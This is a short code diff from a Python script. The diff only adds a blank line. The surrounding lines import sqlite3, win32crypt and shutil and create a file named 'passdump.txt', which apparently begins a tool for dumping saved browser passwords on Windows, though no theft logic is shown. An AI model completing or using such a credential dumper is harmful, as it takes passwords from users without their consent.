@@ -1,4 +1,5 @@
 import os, sqlite3, win32crypt, time, shutil, sys
+
 file = open("passdump.txt", "w")
 file.write("")
 file.close
